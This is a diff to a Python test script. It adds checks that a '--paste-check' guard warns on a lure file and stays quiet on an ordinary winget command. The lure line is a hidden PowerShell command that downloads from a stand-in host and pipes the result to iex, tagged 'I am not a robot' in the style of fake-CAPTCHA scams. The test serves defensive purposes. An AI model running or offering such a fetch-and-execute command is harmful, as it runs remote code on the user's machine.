@@ -214,6 +214,19 @@ def _run(work: Path) -> int:
         code, output = run(*args)
         check(label, code == 0, f"exit {code}: {output[-300:]}")
 
+    # --- the paste guard's classifier over a file, never the clipboard --------
+    lure = work / "lure.txt"
+    lure.write_text('powershell -w hidden -c "iwr https://example.invalid/x | iex" '
+                    '# I am not a robot', encoding="utf-8")
+    code, output = run("--paste-check", str(lure))
+    check("--paste-check warns on a paste-and-run shape", code == 1 and "WARNING" in output,
+          f"exit {code}: {output[-300:]}")
+    safe = work / "safe.txt"
+    safe.write_text("winget install --id Git.Git", encoding="utf-8")
+    code, output = run("--paste-check", str(safe))
+    check("--paste-check is quiet on an ordinary command", code == 0,
+          f"exit {code}: {output[-300:]}")
+
     print()
     if failures:
         print(f"{len(failures)} check(s) failed:")
